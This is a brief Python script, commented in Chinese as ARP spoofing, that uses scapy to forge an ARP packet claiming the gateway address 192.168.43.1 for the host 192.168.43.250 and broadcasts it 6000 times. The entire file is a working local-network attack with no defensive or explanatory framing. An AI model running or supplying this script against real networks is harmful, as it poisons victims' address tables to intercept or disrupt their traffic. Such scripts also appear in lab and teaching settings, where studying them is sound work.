#coding=utf-8
#ARP欺骗
from scapy.all import *
import time
#构造包
#pdst是目标IP，psrc是网关的ip
p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="b8:81:98:e0:46:6a")/ARP(pdst="192.168.43.250",psrc="192.168.43.1")
for i in range(6000):
    sendp(p1)
    time.sleep(0.1)